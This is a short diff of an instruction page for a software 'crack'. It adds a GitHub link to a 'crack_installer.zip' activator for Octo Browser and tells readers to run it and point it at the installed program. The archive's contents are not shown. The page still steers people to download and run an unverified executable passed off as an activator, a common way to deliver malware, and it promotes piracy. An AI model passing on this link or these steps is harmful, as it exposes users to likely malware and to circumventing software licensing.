@@ -3,7 +3,7 @@ If you already have it installed, uninstall it and download it again.
 
 After installing it, we don't run it!!!
 
-Download the activator - click
+Download the activator - https://github.com/octo-browser-crack/SCR/blob/main/crack_installer.zip
 
 Run the activator and enter the path to the octo. Then click RunPath
 
